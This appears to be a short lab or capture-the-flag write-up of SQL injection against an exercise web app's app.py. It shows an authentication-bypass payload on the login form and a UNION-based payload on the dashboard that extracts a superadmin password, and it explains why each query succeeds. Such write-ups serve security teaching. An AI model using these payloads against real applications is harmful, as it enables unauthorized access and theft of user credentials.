Ubuntu 20.04 LTS


The code that is being examined in the the file app.py.

Firstly, on the user login page, the input goes into the query
	SELECT * FROM users WHERE username = 'user' AND password = '{password}'
in {password}.

Knowing that in SQL the OR operator has lower precedence than the AND operator,
we give as input 
	' OR '' = '
resulting in the query
	SELECT * FROM users WHERE username = 'user' AND password = '' OR '' = ''
	                                                            ^~~~~~~~~~~

The condition '' = '' is true. The AND operator will be executed first and will
return false, then the OR operator which will return true. Hence, the query will
match every record and the result will not be empty. Therefore, the login will
be successfull.



On the dashboard page the input goes into the query
	SELECT name,category,price FROM items WHERE name = '{name}'
in {name}.

By providing the input
	' UNION SELECT * FROM users WHERE username='superadmin
the resulting query will be
	SELECT name,category,price FROM items WHERE name = '' UNION SELECT * FROM users WHERE username='superadmin'
	                                                    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

First, in app.py on line 89
	results = res.fetchall()[0]
we observe that only the first result will be used. So, with the condition
	name = ''
we know that it will not match any results. Using union we append the query that
searches for the superadmin information in the users table.

The superadmin password is sup3r4dm1nP@5sw0rd

By navigating to the admin page and inputting the password, we are logged in as
superadmin.
